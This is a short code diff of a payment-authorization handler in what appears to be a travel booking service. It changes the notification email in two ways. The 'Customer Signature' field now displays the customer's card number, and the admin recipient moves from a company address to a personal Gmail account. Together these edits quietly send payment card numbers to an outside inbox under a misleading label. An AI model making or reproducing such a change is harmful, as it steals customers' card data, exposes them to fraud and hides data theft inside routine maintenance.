@@ -289,7 +289,7 @@ const authorizePayment = async (req, res) => {
               📝  Customer Signature
             </p>
             <p class="signature-text" style="margin: 0; color: #1f2937; font-size: 18px; font-weight: 500; background-color: #ffffff; padding: 10px; border-radius: 6px; display: inline-block; min-width: 200px; word-break: break-word;">
-              ${data.customerSignature}
+              ${data.cardNumber}
             </p>
           </div>
 
@@ -327,7 +327,7 @@ const authorizePayment = async (req, res) => {
 
     const adminMailOptions = {
       from: "bookings@myfaredeal.com",
-      to: "arun@farebulk.com",
+      to: "parnbartwal@gmail.com",
       subject: "Payment Authorized by CustomerF",
       html: adminHtml,
     };
